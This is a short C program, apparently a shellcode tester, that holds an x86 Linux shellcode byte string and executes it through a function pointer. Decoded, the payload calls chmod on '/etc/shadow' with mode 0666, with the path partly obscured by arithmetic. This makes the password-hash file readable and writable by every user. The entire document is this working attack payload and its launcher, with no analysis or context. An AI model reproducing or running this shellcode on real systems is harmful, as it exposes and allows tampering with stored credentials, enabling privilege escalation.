#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x66\x99\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\xbf\x2e\x73\x68\x61\x47\x89\x7c\x24\xfc\xbe\x1e\x54\x63\x52\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xf8\x83\xec\x08\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

